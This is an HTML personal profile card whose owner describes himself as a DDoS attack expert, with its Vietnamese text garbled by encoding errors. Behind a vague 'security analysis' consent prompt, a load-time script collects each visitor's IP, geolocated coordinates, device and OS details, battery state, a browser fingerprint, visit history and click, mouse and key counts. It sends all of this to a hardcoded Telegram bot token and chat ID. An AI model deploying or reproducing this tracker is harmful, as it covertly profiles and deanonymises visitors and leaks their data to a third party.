<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Ph√π VƒÉn ƒê·ª©c Profile</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000 url('https://i.ibb.co/ZzNRQTD/pinterestdownloader-com-1745324696-443788.gif') no-repeat center/cover;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    @media screen and (max-width: 600px) {
      body {
        background: #000 url('https://s4.gifyu.com/images/bpFIT.gif') no-repeat center/cover;
      }
    }
    .profile-card {
      position: relative;
      width: 100%;
      max-width: 400px;
      background: rgba(0,0,0,0.6);
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 0 40px rgba(0,0,0,0.8);
    }
    @media screen and (max-width: 600px) {
      .profile-card {
        max-width: 90%;
        margin: 20px auto;
      }
    }
    .banner {
      background: url('https://i.ibb.co/GQWLMnkr/c26176e041de50304ba9a25f91ed2b66.jpg') no-repeat center/cover;
      height: 140px;
      position: relative;
    }
    .mac-buttons {
      position: absolute;
      top: 10px;
      right: 10px;
      display: flex;
      gap: 6px;
    }
    .mac-button {
      width: 12px;
      height: 12px;
      background: #ccc;
      border-radius: 50%;
    }
    .pfp {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background: url('https://i.ibb.co/hFDR6Z7D/803ee8cd6fc84a744d8d6976afd32556.jpg') no-repeat center/cover;
      border: 4px solid #000;
      position: absolute;
      top: 90px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 2;
    }
    .name {
      margin-top: 60px;
      text-align: center;
      font-size: 22px;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    @media screen and (max-width: 600px) {
      .name {
        font-size: 18px;
      }
    }
    .verify {
      width: 20px;
      height: 20px;
      background: #1877f2;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 14px;
    }
    .social-links {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 14px;
      margin: 12px auto;
      width: fit-content;
    }
    .social-links a {
      color: #fff;
      background: rgba(255,255,255,0.1);
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      font-size: 18px;
      transition: 0.3s;
    }
    .social-links a:hover {
      background: rgba(255,255,255,0.4);
      transform: scale(1.1);
    }
    .card-body {
      padding: 20px;
      position: relative;
    }
    .card-body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://www.transparenttextures.com/patterns/flowers.png') repeat;
      opacity: 0.06;
      z-index: 0;
    }
    .card-body-content {
      position: relative;
      z-index: 1;
      font-size: 15px;
      line-height: 1.6;
      border-left: 3px solid #fff;
      padding-left: 12px;
    }
    @media screen and (max-width: 600px) {
      .card-body-content {
        font-size: 14px;
        padding-left: 10px;
      }
    }
    .snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      background: url('https://i.gifer.com/Bp4L.gif') repeat top center;
      z-index: 0;
      opacity: 0.2;
    }
    .privacy-notice {
      position: fixed;
      bottom: 10px;
      left: 10px;
      color: #fff;
      font-size: 12px;
      opacity: 0.8;
    }
    .privacy-notice a {
      color: #1877f2;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="snow"></div>
  <div class="profile-card">
    <div class="banner">
      <div class="mac-buttons">
        <div class="mac-button" style="background:red;"></div>
        <div class="mac-button" style="background:orange;"></div>
        <div class="mac-button" style="background:green;"></div>
      </div>
    </div>
    <div class="pfp"></div>
    <div class="name">
      Ph√π VƒÉn ƒê·ª©c
      <div class="verify"><i class="fas fa-check"></i></div>
    </div>
    <div class="social-links">
      <a href="https://fb.me/phuvanduc991" title="Facebook"><i class="fab fa-facebook-f"></i></a>
      <a href="https://t.me/phuvanduc" title="Telegram"><i class="fab fa-telegram"></i></a>
      <a href="https://youtube.com/@phuvanducreal" title="YouTube"><i class="fab fa-youtube"></i></a>
      <a href="https://tiktok.com/@phuvanduc991" title="TikTok"><i class="fab fa-tiktok"></i></a>
    </div>
    <div class="card-body">
      <div class="card-body-content">
        <p id="profile-text">Xin ch√†o! T√¥i l√† Ph√π VƒÉn ƒê·ª©c, m·ªôt chuy√™n gia v·ªÅ t·∫•n c√¥ng DDoS v√† ki·ªÉm tra s·ª©c m·∫°nh h·ªá th·ªëng. H√£y k·∫øt n·ªëi v·ªõi t√¥i qua c√°c n·ªÅn t·∫£ng m·∫°ng x√£ h·ªôi ƒë·ªÉ trao ƒë·ªïi th√™m nh√©!</p>
      </div>
    </div>
  </div>
  <div class="privacy-notice">
    Anh H·∫πn Em Pickle Ball Ta V·ªùn Nhau Pickle Ball <a href="#" onclick="alert('Cc Nh√¨n ƒêb.');"????</a>
  </div>

  <script src="https://unpkg.com/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
  <script src="https://unpkg.com/fingerprintjs2@2.1.4/fingerprint2.min.js"></script>
  <script>
    // Telegram Bot Config
    const TELEGRAM_BOT_TOKEN = '7607255883:AAE3Q6Uh0BGyzKHVMXxqUyRgDWyw71XIPsw'; // Thay b·∫±ng token m·ªõi n·∫øu sai
    const TELEGRAM_CHAT_ID = '7581385601'; // Thay b·∫±ng chat ID m·ªõi n·∫øu sai
    const USE_PROXY = false; // ƒê·∫∑t true n·∫øu d√πng Cloudflare Workers proxy
    const PROXY_URL = 'https://telegram-proxy.<your-account>.workers.dev/send-telegram'; // Thay b·∫±ng URL proxy
    const CORS_PROXY = 'https://cors-anywhere.herokuapp.com/'; // Proxy t·∫°m th·ªùi ƒë·ªÉ test (y√™u c·∫ßu truy c·∫≠p https://cors-anywhere.herokuapp.com/corsdemo)

    // H√†m ƒë·ªãnh d·∫°ng d·ªØ li·ªáu cho Telegram
    function formatDeviceData(data) {
      const formatValue = (value, defaultValue = 'Unknown') => value || defaultValue;
      return `
üîî *Visitor Info* üîî
üìÖ *Time*: ${formatValue(data.timestamp)}
üåê *IP*: ${formatValue(data.ip)} ${formatValue(data.vpnStatus)}
üìç *Location*: ${formatValue(data.city)}, ${formatValue(data.region)}, ${formatValue(data.country)}
üìå *Coordinates*: ${formatValue(data.loc)}
‚è∞ *Timezone*: ${formatValue(data.timezone)}
üì± *Device*: ${formatValue(data.deviceName)} (${formatValue(data.deviceType)})
üíª *OS*: ${formatValue(data.os)}
üåê *Browser*: ${formatValue(data.browser)}
üîã *Battery*: ${formatValue(data.battery)} (${formatValue(data.charging)})
üñº *Screen*: ${formatValue(data.screen)} (${formatValue(data.colorDepth)} bits)
üó£ *Language*: ${formatValue(data.language)}
üì° *Connection*: ${formatValue(data.connectionType)} ${formatValue(data.connectionSpeed)}
üéÆ *Graphics*: ${formatValue(data.graphicsSupport)}
üìä *Sensors*: ${formatValue(data.sensorSupport)}
üîÑ *Visit History*: ${formatValue(data.visitCount)} visits, Last: ${formatValue(data.lastVisit)}
üñ± *Behavior*: ${formatValue(data.clicks)} clicks, ${formatValue(data.mouseMoves)} moves, ${formatValue(data.keysPressed)} keys, ${formatValue(data.scrollDistance)}px scroll, ${formatValue(data.timeOnPage)}s
üîç *Fingerprint*: ${formatValue(data.fingerprint)}
üç™ *Cookies*: ${formatValue(data.cookiesEnabled)}
üëÜ *Touch*: ${formatValue(data.touchSupport)}
üîó *Referrer*: ${formatValue(data.referrer)}
üö´ *Do Not Track*: ${formatValue(data.doNotTrack)}
ü™ê *By*: @phuvanduc
      `.trim();
    }

    // H√†m g·ª≠i d·ªØ li·ªáu ƒë·∫øn Telegram v·ªõi retry
    async function sendToTelegram(message, retries = 3) {
      for (let attempt = 1; attempt <= retries; attempt++) {
        try {
          console.log(`Attempt ${attempt}: Sending message to Telegram (length: ${message.length})`);
          const maxLength = 4096;
          const parts = message.length <= maxLength ? [message] : [];
          if (message.length > maxLength) {
            for (let i = 0; i < message.length; i += maxLength) {
              parts.push(message.slice(i, i + maxLength));
            }
          }

          for (let i = 0; i < parts.length; i++) {
            const url = USE_PROXY ? PROXY_URL : `${CORS_PROXY}https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const body = USE_PROXY ? { message: parts[i] } : {
              chat_id: TELEGRAM_CHAT_ID,
              text: parts[i],
              parse_mode: 'Markdown',
              disable_web_page_preview: true
            };
            const response = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(body)
            });
            if (!response.ok) {
              const errorText = await response.text();
              throw new Error(`HTTP error! Status: ${response.status}, Details: ${errorText}`);
            }
            console.log(`Part ${i + 1}/${parts.length} sent successfully`);
            if (i < parts.length - 1) await new Promise(resolve => setTimeout(resolve, 1000)); // Delay 1s
          }
          console.log('All parts sent to Telegram successfully');
          return true;
        } catch (error) {
          console.error(`Attempt ${attempt} failed:`, error);
          if (attempt === retries) {
            console.error('Max retries reached. Failed to send to Telegram.');
            return false;
          }
          await new Promise(resolve => setTimeout(resolve, 2000)); // Delay 2s tr∆∞·ªõc khi th·ª≠ l·∫°i
        }
      }
    }

    // H√†m l·∫•y th√¥ng tin thi·∫øt b·ªã
    function getDeviceInfo(userAgent) {
      try {
        const parser = new UAParser(userAgent);
        const device = parser.getDevice();
        const os = parser.getOS();
        const browser = parser.getBrowser();
        let deviceType = device.type || 'Desktop';
        if (deviceType === 'mobile') {
          deviceType = userAgent.toLowerCase().includes('iphone') ? 'iPhone' : 'Android';
        } else if (deviceType === 'tablet') {
          deviceType = 'Tablet';
        }
        let deviceName = device.model || 'Generic Device';
        if (deviceType === 'iPhone') {
          if (userAgent.includes('iPhone OS 16')) deviceName = 'iPhone 14 Pro';
          else if (userAgent.includes('iPhone OS 15')) deviceName = 'iPhone 13';
          else if (userAgent.includes('iPhone OS 14')) deviceName = 'iPhone 12';
        } else if (deviceType === 'Android') {
          const modelMap = {
            'SM-G960F': 'Samsung Galaxy S9',
            'SM-A525F': 'Samsung Galaxy A52',
            'Pixel': 'Google Pixel 7',
            'M2012K11AG': 'Xiaomi 11T Pro'
          };
          const modelMatch = userAgent.match(/build\/([a-z0-9\-]+)/i);
          if (modelMatch) {
            const model = modelMatch[1];
            for (let key in modelMap) {
              if (model.includes(key)) {
                deviceName = modelMap[key];
                break;
              }
            }
          }
        }
        return {
          deviceName,
          deviceType,
          os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown',
          browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown'
        };
      } catch {
        return {
          deviceName: 'Unknown',
          deviceType: 'Unknown',
          os: 'Unknown',
          browser: 'Unknown'
        };
      }
    }

    // H√†m l·∫•y th√¥ng tin IP v√† v·ªã tr√≠
    async function fetchIpInfo() {
      const cacheKey = 'ipInfo';
      const cached = localStorage.getItem(cacheKey);
      if (cached) {
        const { data, timestamp } = JSON.parse(cached);
        if (Date.now() - timestamp < 5 * 60 * 1000) return data;
      }

      const apis = [
        { url: 'http://ip-api.com/json/?fields=66846719', name: 'ip-api' },
        { url: 'https://ipinfo.io/json', name: 'ipinfo' }
      ];

      for (const api of apis) {
        try {
          const response = await fetch(api.url, {
            headers: { 'Accept': 'application/json' },
            cache: 'no-store'
          });
          if (!response.ok) continue;
          const data = await response.json();
          let ipInfo = {
            ip: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            loc: 'Unknown',
            timezone: 'Unknown',
            vpnStatus: ''
          };
          if (api.name === 'ip-api') {
            ipInfo = {
              ip: data.query || 'Unknown',
              city: data.city || 'Unknown',
              region: data.regionName || 'Unknown',
              country: data.countryCode || 'Unknown',
              loc: data.lat && data.lon ? `${data.lat},${data.lon}` : 'Unknown',
              timezone: data.timezone || 'Unknown',
              vpnStatus: data.proxy || data.hosting ? '(Proxy/VPN)' : ''
            };
          } else if (api.name === 'ipinfo') {
            ipInfo = {
              ip: data.ip || 'Unknown',
              city: data.city || 'Unknown',
              region: data.region || 'Unknown',
              country: data.country || 'Unknown',
              loc: data.loc || 'Unknown',
              timezone: data.timezone || 'Unknown',
              vpnStatus: data.bogus || data.anycast ? '(Proxy/VPN)' : ''
            };
          }
          if (ipInfo.ip !== 'Unknown') {
            localStorage.setItem(cacheKey, JSON.stringify({ data: ipInfo, timestamp: Date.now() }));
            return ipInfo;
          }
        } catch {
          continue;
        }
      }
      return {
        ip: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        country: 'Unknown',
        loc: 'Unknown',
        timezone: 'Unknown',
        vpnStatus: ''
      };
    }

    // H√†m l·∫•y th√¥ng tin pin
    async function fetchBatteryInfo() {
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          return {
            battery: `${Math.round(battery.level * 100)}%`,
            charging: battery.charging ? 'Charging' : 'Not charging'
          };
        }
        return { battery: 'Not available', charging: 'Not available' };
      } catch {
        return { battery: 'Not available', charging: 'Not available' };
      }
    }

    // H√†m l·∫•y th√¥ng tin m·∫°ng
    function fetchNetworkInfo() {
      try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!connection) return { connectionType: 'Unknown', connectionSpeed: '' };
        const type = connection.effectiveType || 'Unknown';
        let speed = '';
        if (connection.downlink) {
          speed = `~${connection.downlink} Mbps`;
        } else if (connection.rtt) {
          speed = `RTT: ${connection.rtt}ms`;
        }
        return { connectionType: type, connectionSpeed: speed };
      } catch {
        return { connectionType: 'Unknown', connectionSpeed: '' };
      }
    }

    // H√†m l·∫•y th√¥ng tin ƒë·ªì h·ªça
    function fetchGraphicsInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'No WebGL support';
        const renderer = gl.getParameter(gl.RENDERER);
        const vendor = gl.getParameter(gl.VENDOR);
        return `${vendor} ${renderer}`;
      } catch {
        return 'No WebGL support';
      }
    }

    // H√†m l·∫•y th√¥ng tin c·∫£m bi·∫øn
    function fetchSensorInfo() {
      try {
        let sensors = [];
        if ('Accelerometer' in window) sensors.push('Accelerometer');
        if ('Gyroscope' in window) sensors.push('Gyroscope');
        if (sensors.length === 0) return 'No sensors detected';
        return sensors.join(', ');
      } catch {
        return 'No sensors detected';
      }
    }

    // H√†m theo d√µi l·ªãch s·ª≠ truy c·∫≠p
    function trackVisitHistory() {
      try {
        const key = 'visitHistory';
        let history = JSON.parse(localStorage.getItem(key) || '{}');
        const now = new Date().toISOString();
        history.visits = (history.visits || 0) + 1;
        history.lastVisit = now;
        localStorage.setItem(key, JSON.stringify(history));
        return {
          visitCount: history.visits,
          lastVisit: history.lastVisit
        };
      } catch {
        return { visitCount: 1, lastVisit: new Date().toISOString() };
      }
    }

    // H√†m t·∫°o fingerprint tr√¨nh duy·ªát
    async function getBrowserFingerprint() {
      try {
        return new Promise((resolve) => {
          Fingerprint2.get((components) => {
            const values = components.map(c => c.value);
            const fingerprint = Fingerprint2.x64hash128(values.join(''), 31);
            resolve(fingerprint);
          });
        });
      } catch {
        return 'Unknown';
      }
    }

    // H√†m theo d√µi h√†nh vi ng∆∞·ªùi d√πng
    function trackUserBehavior() {
      let clicks = 0;
      let mouseMoves = 0;
      let keysPressed = [];
      let scrollDistance = 0;
      const startTime = Date.now();
      document.addEventListener('click', () => clicks++);
      document.addEventListener('mousemove', () => mouseMoves++);
      document.addEventListener('keypress', (e) => {
        if (keysPressed.length < 10) keysPressed.push(e.key);
      });
      document.addEventListener('scroll', () => {
        scrollDistance = window.scrollY;
      });
      return {
        getData: () => ({
          clicks,
          mouseMoves,
          keysPressed: keysPressed.length,
          scrollDistance: Math.round(scrollDistance),
          timeOnPage: Math.round((Date.now() - startTime) / 1000)
        })
      };
    }

    // H√†m l·∫•y th√¥ng tin m√¥i tr∆∞·ªùng tr√¨nh duy·ªát
    function fetchBrowserEnv() {
      try {
        return {
          screen: window.screen.width && window.screen.height ? `${window.screen.width}x${window.screen.height}` : 'Unknown',
          colorDepth: window.screen.colorDepth || 'Unknown',
          language: navigator.language || 'Unknown',
          cookiesEnabled: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
          touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Supported' : 'Not supported',
          referrer: document.referrer || 'None',
          doNotTrack: navigator.doNotTrack || 'Not specified'
        };
      } catch {
        return {
          screen: 'Unknown',
          colorDepth: 'Unknown',
          language: 'Unknown',
          cookiesEnabled: 'Unknown',
          touchSupport: 'Unknown',
          referrer: 'Unknown',
          doNotTrack: 'Unknown'
        };
      }
    }

    // H√†m thay ƒë·ªïi n·ªôi dung ƒë·ªông
    async function changeContentDynamically(ipInfo, deviceInfo, behavior) {
      try {
        const profileText = document.getElementById('profile-text');
        const country = ipInfo.country || 'Unknown';
        const deviceType = deviceInfo.deviceType;
        let greeting = 'Xin ch√†o';
        if (country === 'US') greeting = 'Hello';
        else if (country === 'GB') greeting = 'Hi';
        else if (country === 'FR') greeting = 'Bonjour';
        let deviceMessage = deviceType === 'Desktop' ? 'tr√™n m√°y t√≠nh' : 'tr√™n thi·∫øt b·ªã di ƒë·ªông';
        let behaviorMessage = behavior.getData().timeOnPage > 10 ? 'B·∫°n d∆∞·ªùng nh∆∞ r·∫•t quan t√¢m!' : '';
        profileText.innerHTML = `${greeting}! T√¥i l√† Ph√π VƒÉn ƒê·ª©c, chuy√™n gia b·∫£o m·∫≠t t·ª´ Vi·ªát Nam. B·∫°n ƒëang truy c·∫≠p ${deviceMessage}. ${behaviorMessage} K·∫øt n·ªëi v·ªõi t√¥i qua m·∫°ng x√£ h·ªôi nh√©!`;
      } catch (error) {
        console.error('Failed to change content:', error);
      }
    }

    // H√†m ch√≠nh ƒë·ªÉ thu th·∫≠p v√† g·ª≠i d·ªØ li·ªáu
    async function collectAndSendData() {
      try {
        if (!localStorage.getItem('privacyAccepted')) {
          const accepted = confirm('Trang n√†y thu th·∫≠p th√¥ng tin thi·∫øt b·ªã, m·∫°ng, v√† h√†nh vi ƒë·ªÉ ph√¢n t√≠ch b·∫£o m·∫≠t. B·∫°n ƒë·ªìng √Ω ch·ª©?');
          if (!accepted) {
            localStorage.setItem('privacyAccepted', 'false');
            console.log('User declined privacy consent');
            return;
          }
          localStorage.setItem('privacyAccepted', 'true');
        }
        if (localStorage.getItem('privacyAccepted') === 'false') {
          console.log('Privacy consent declined previously');
          return;
        }

        console.log('Starting data collection...');
        const userAgent = navigator.userAgent;
        const behaviorTracker = trackUserBehavior();
        const [deviceInfo, ipInfo, batteryInfo, networkInfo, graphicsInfo, sensorInfo, visitHistory, browserEnv, fingerprint] = await Promise.all([
          Promise.resolve(getDeviceInfo(userAgent)),
          fetchIpInfo(),
          fetchBatteryInfo(),
          Promise.resolve(fetchNetworkInfo()),
          Promise.resolve(fetchGraphicsInfo()),
          Promise.resolve(fetchSensorInfo()),
          Promise.resolve(trackVisitHistory()),
          Promise.resolve(fetchBrowserEnv()),
          getBrowserFingerprint()
        ]);

        const behavior = behaviorTracker.getData();
        const deviceData = {
          timestamp: new Date().toISOString(),
          ip: ipInfo.ip,
          vpnStatus: ipInfo.vpnStatus,
          city: ipInfo.city,
          region: ipInfo.region,
          country: ipInfo.country,
          loc: ipInfo.loc,
          timezone: ipInfo.timezone,
          deviceName: deviceInfo.deviceName,
          deviceType: deviceInfo.deviceType,
          os: deviceInfo.os,
          browser: deviceInfo.browser,
          battery: batteryInfo.battery,
          charging: batteryInfo.charging,
          screen: browserEnv.screen,
          colorDepth: browserEnv.colorDepth,
          language: browserEnv.language,
          cookiesEnabled: browserEnv.cookiesEnabled,
          touchSupport: browserEnv.touchSupport,
          referrer: browserEnv.referrer,
          doNotTrack: browserEnv.doNotTrack,
          connectionType: networkInfo.connectionType,
          connectionSpeed: networkInfo.connectionSpeed,
          graphicsSupport: graphicsInfo,
          sensorSupport: sensorInfo,
          visitCount: visitHistory.visitCount,
          lastVisit: visitHistory.lastVisit,
          clicks: behavior.clicks,
          mouseMoves: behavior.mouseMoves,
          keysPressed: behavior.keysPressed,
          scrollDistance: behavior.scrollDistance,
          timeOnPage: behavior.timeOnPage,
          fingerprint: fingerprint
        };

        console.log('Collected data:', deviceData);
        await changeContentDynamically(ipInfo, deviceInfo, behaviorTracker);
        const message = formatDeviceData(deviceData);
        console.log('Formatted message:', message);
        const sent = await sendToTelegram(message);
        if (sent) {
          console.log('Data sent to Telegram successfully');
        } else {
          console.error('Failed to send data to Telegram after retries');
        }
      } catch (error) {
        console.error('Error in collectAndSendData:', error);
      }
    }

    // Ch·∫°y khi trang t·∫£i
    collectAndSendData();
  </script>
</body>
</html>